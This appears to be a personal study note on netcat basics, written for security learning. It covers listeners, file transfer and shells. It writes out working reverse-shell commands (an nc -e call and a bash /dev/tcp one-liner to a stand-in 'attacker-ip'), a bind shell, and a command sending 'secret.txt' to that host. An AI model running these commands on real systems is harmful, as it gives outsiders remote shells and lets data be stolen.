---
ID: REC002  
Date: 04-08-2025  
Tags: #netcat #reverse-shell #recon #networking #linux  
Category: Reconnaissance  
---

# REC002 – Netcat Basics & Reverse Shells

## 🧠 What I Learned

**Netcat** (often abbreviated as `nc`) is called the *Swiss Army knife* of networking. It's used for:
- Banner grabbing
- File transfer
- Port scanning
- Setting up listeners
- Reverse/Bind shells for exploitation

---

## 📡 Starting a Listener
```bash
nc -lvnp 4444

- `-l` = listen  
- `-v` = verbose output  
- `-n` = numeric IPs (no DNS resolution)  
- `-p` = port to listen on
```
This waits for a connection on port 4444.

---

## 🔁 Sending a Reverse Shell
```bash
nc attacker-ip 4444 -e /bin/bash
```
- `-e` executes the given command (i.e spawns a bash shell)
- **Requires traditional netcat** (`netcat-traditional`), not `ncat` or `openbsd-netcat`

Alternative for restricted shells:
```bash
bash -i >& /dev/tcp/attacker-ip/4444 0>&1
```
---

## 📂 Transferring Files
```bash
nc -lvp 1337 > received.txt
```

```bash
nc attacker-ip 1337 < secret.txt
```
---

## 🧱 Bind Shell (less stealthy)
```bash
nc -lvnp 5555 -e /bin/bash
```
This creates a shell on the **target** that the attacker connects to, not ideal in firewalled environments.

---

## ⚠️ Security Note

Many modern systems:
- Disable `-e` for security (especially `openbsd-netcat`)
- Flag `nc` usage as suspicious
- Require reverse shells to be obfuscated (e.g., Base64-encoded payloads)

---

## 🔗 Resources

- [GTFOBins: Netcat](https://gtfobins.github.io/gtfobins/nc/)  
- [HackTricks – Reverse Shell Cheatsheet](https://book.hacktricks.xyz/pentesting-web/shells/reverse-shell-cheatsheet)  
- [Netcat Cheat Sheet – SANS](https://pen-testing.sans.org/blog/2013/04/09/netcat-cheat-sheet)

---
